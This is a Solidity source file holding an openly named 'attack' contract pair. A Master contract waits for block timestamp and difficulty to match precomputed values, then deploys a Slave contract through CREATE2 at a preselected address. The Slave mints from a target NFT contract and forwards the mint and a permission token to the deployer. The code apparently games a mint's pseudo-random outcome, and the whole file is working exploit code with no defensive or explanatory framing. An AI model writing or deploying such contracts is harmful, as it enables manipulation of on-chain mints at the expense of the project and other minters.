// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Master is IERC721Receiver {
    address me;
    constructor() {
        me = msg.sender;
    }
    
    function onERC721Received(address operator, address from, uint256 tokenId, bytes memory data) public override returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    function attack(
        address permissionContract,
        address mintingContract,
        uint256 permissionTokenId,
        uint256 collectionId,
        uint256 parentTimestamp,
        uint256[] memory diffs,
        bytes32[] memory salts,
        address[] memory addrs
    ) public {
        require(msg.sender == me, "wrong deployer");

        // Deploy Slave
        uint index = block.timestamp - parentTimestamp;
        require(block.difficulty == diffs[index], "bad difficulty");
        bytes32 salt = salts[index];
        Slave slave = new Slave{salt: salt}();
        require(address(slave) == addrs[index], "bad slave addr");
        
        // Transfer ERC721 Permission Token to Slave.
        PermissionTokenContract p = PermissionTokenContract(permissionContract);
        p.safeTransferFrom(address(this), address(slave), permissionTokenId);
        
        // Pass the destination wallet address to the slave and execute the mint.
        slave.mint(permissionContract, mintingContract, me, collectionId, permissionTokenId);

        // Verify, again, that I got the permission token back from the slave.
        require(p.ownerOf(permissionTokenId) == me);
    }

    function withdraw(address erc721, uint256 tokenId) public {
        require(msg.sender == me, "nice try");
        PermissionTokenContract p = PermissionTokenContract(erc721);
        p.safeTransferFrom(address(this), me, tokenId);
    }
}

contract Slave is IERC721Receiver {
    function mint(
        address permissionContract,
        address mintingContract,
        address destinationWallet,
        uint256 collectionId,
        uint256 permissionTokenId
    ) public {
        // Mint the NFT and deliver in the destination wallet
        MintContract m = MintContract(mintingContract);
        m.mint(address(this), collectionId, permissionTokenId);
        uint256 mintId = m.getTokensByOwner(address(this))[0];
        m.safeTransferFrom(address(this), destinationWallet, mintId);
        require(m.ownerOf(mintId) == destinationWallet, "destination didn't get mint");

        // Transfer permission token to destination wallet
        PermissionTokenContract p = PermissionTokenContract(permissionContract);
        p.safeTransferFrom(address(this), destinationWallet, permissionTokenId);
        require(p.ownerOf(permissionTokenId) == destinationWallet, "permission tk was not returned");
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes memory data) public override returns(bytes4) {
        return this.onERC721Received.selector;
    }
}

abstract contract MintContract {
    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual;
    function ownerOf(uint256 tokenId) external view virtual returns (address owner);

    function mint(address _to, uint256 _collectionId, uint256 _membershipId) public payable virtual;
    function getTokensByOwner(address _owner) public view virtual returns (uint256[] memory);
}

abstract contract PermissionTokenContract {
    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual;
    function ownerOf(uint256 tokenId) external view virtual returns (address owner);
}
